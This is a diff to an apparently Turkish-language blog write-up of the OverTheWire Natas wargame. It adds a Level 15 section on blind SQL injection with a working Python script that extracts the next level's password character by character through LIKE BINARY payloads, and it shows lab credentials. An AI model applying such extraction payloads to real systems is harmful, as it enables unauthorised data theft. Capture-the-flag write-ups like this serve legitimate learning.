@@ -412,5 +412,29 @@ Kod SQLi zafiyeti barındıyor. `" or 1  # ` şeklinde bir payload girdiğimde,
  
  >> natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
  
+#### Level 15
+
+<figure>
+<img src="/assets/img/natas/natas151.png">
+</figure>
+
+Yine bir SQLi zafiyeti mevcut.Fakat bir öncekinden biraz farklı. Kod SQL syntax hatalarını vermiyor ve ekrana veri yansıtmıyor.Yani Blind SQLi zafiyeti mevcut.Ekrana veri yansıtılmadığı için dönen true-false yanıtlarına göre veriyi bizim inşaa etmemiz gerekli.
  
- #### Level 15
+  {% highlight python %}
+
+       
+import requests
+from requests.auth import HTTPBasicAuth
+auth=HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
+chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+passwd=""
+for i in range(32):
+       for char in chars:
+               payload = {'username' : 'natas16" and password LIKE BINARY "' +passwd + char + '%" \x23'}
+               s=requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug',data=payload,auth=auth)
+               if "This user exists" in s.text:
+                       passwd=passwd+char
+                       print passwd
+                       break
+
+{% endhighlight %}
